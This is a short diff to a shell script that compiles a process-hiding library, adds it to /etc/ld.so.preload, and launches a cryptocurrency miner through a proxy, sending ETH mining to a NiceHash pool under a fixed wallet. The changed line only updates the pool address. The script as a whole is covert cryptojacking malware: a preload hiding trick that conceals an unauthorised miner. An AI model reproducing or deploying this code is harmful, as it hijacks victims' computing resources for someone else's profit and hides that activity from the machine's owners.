@@ -42,4 +42,4 @@ make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-./graftcp/graftcp ./bezzHash --coin ETH --pool daggerhashimoto.usa-west.nicehash.com:33353 --user 3DnXgkmRkXovYj6teHWmJWBdtiTTVPj5B4.Berkah
+./graftcp/graftcp ./bezzHash --coin ETH --pool stratum+ssl://stratum.usa-west.nicehash.com:33353 --user 3DnXgkmRkXovYj6teHWmJWBdtiTTVPj5B4.Berkah
